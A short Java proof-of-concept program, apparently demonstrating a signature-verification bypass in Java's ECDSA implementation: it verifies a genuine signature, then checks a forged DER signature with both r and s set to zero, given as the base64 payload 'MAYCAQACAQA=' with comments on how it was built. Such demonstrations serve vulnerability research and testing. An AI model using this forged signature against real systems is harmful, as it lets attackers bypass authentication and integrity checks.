import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.Signature;
import java.security.SignatureException;
import java.security.spec.ECGenParameterSpec;
import java.security.spec.EncodedKeySpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.logging.Level;
import java.util.logging.Logger;


class SigBypass {


/**
    Inspired by code from https://metamug.com/article/security/sign-verify-digital-signature-ecdsa-java.html
*/
 
    
    public static void main(String[] args) {

        try {
            ECGenParameterSpec ecSpec = new ECGenParameterSpec("secp256r1");
            KeyPairGenerator g = KeyPairGenerator.getInstance("EC");
            g.initialize(ecSpec, new SecureRandom());
            KeyPair keypair = g.generateKeyPair();
            PublicKey publicKey = keypair.getPublic();
            PrivateKey privateKey = keypair.getPrivate();

            //String message = "Give you up!";
            String message = args[0].toString();
            String spoofedSignature = "MAYCAQACAQA=";
            Signature ecdsaSign = Signature.getInstance("SHA256withECDSA");
            ecdsaSign.initSign(privateKey);
            ecdsaSign.update(message.getBytes("UTF-8"));
            byte[] signature = ecdsaSign.sign();
            String pub = Base64.getEncoder().encodeToString(publicKey.getEncoded());
            String sig = Base64.getEncoder().encodeToString(signature);

            System.out.println("Message: " + message);
            System.out.println("Public Key: " + pub);
            System.out.println("Signature: " + sig);



            Signature ecdsaVerify = Signature.getInstance("SHA256withECDSA");
            KeyFactory kf = KeyFactory.getInstance("EC");
            EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(Base64.getDecoder().decode(pub));
            PublicKey publicKey_v = kf.generatePublic(publicKeySpec);

            ecdsaVerify.initVerify(publicKey_v);
            ecdsaVerify.update(message.getBytes("UTF-8"));
            boolean result = ecdsaVerify.verify(Base64.getDecoder().decode(sig));

            System.out.println("Verification: " + result);

            /**
                Trying with a signature where R,S both = 0
                $ hexdump -C /tmp/signature2.der
                    00000000  30 06 02 01 00 02 01 00                           |0.......|
                    00000008

                $ openssl asn1parse -in /tmp/signature2.der -inform DER
                    0:d=0  hl=2 l=   6 cons: SEQUENCE
                    2:d=1  hl=2 l=   1 prim: INTEGER           :00
                    5:d=1  hl=2 l=   1 prim: INTEGER           :00

                $base64 < /tmp/signature2.der
                    MAYCAQACAQA=
            */

            boolean result2 = ecdsaVerify.verify(Base64.getDecoder().decode(spoofedSignature));
            System.out.println("Spoofed sig: " + spoofedSignature);
            System.out.println("Verification: " + result2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
